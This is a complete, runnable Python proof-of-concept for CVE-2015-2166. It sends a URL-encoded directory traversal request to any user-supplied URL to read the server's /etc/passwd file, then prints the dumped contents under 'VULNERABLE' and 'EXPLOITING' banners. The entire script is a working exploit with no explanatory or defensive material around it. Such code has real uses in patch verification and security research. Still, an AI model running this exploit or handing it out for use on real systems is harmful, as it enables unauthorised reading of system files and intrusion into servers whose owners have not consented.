#!/bin/python3

import time
import requests
import argparse
from colorama import init, Fore, Style
from datetime import datetime

current_time = datetime.now().strftime("%H:%M:%S")

GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RED = Fore.RED
BLUE = Fore.BLUE
CYAN = Fore.CYAN
WHITE = Fore.WHITE
MAGENTA = Fore.MAGENTA
NC = Style.RESET_ALL

def check_vulnerability(url, verify_cert):
    exploit_payload = "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
    full_url = url + exploit_payload

    try:
        response = requests.get(full_url, verify=verify_cert)
        if response.status_code == 200 or response.status_code == 302:
            print(f"{WHITE}[{YELLOW}{current_time}{WHITE}] {WHITE}[{CYAN}INFO{WHITE}] {WHITE}[{YELLOW}CHECKING{WHITE}] {GREEN}{url}")
            print("")
            print(f"{WHITE}[{YELLOW}{current_time}{WHITE}] {WHITE}[{CYAN}INFO{WHITE}] {WHITE}[{MAGENTA}VULNERABLE{WHITE}] {GREEN}{url}{MAGENTA}{exploit_payload}")
            print(f"{WHITE}[{YELLOW}{current_time}{WHITE}] {WHITE}[{CYAN}INFO{WHITE}] {WHITE}[{MAGENTA}EXPLOITING{WHITE}] {GREEN}{url}{MAGENTA}{exploit_payload}")
            print(f"{WHITE}")
            time.sleep(2)
            dump_data = response.text
            print(dump_data)
        else:
            print(f"{WHITE}[{YELLOW}{current_time}{WHITE}] {WHITE}[{CYAN}INFO{WHITE}] {WHITE}[{RED}NOT-VULNERABLE{WHITE}] {GREEN}{url}")
    except requests.exceptions.RequestException as e:
        print("An error occurred:", str(e))

def main():
    parser = argparse.ArgumentParser(description="CVE-2015-2166 PoC (Proof of Concept)")
    parser.add_argument("url", help="The URL to check for vulnerability.")
    parser.add_argument("--no-verify", action="store_false", dest="verify_cert", help="Disable SSL certificate verification.")
    args = parser.parse_args()

    check_vulnerability(args.url, args.verify_cert)

if __name__ == "__main__":
    main()
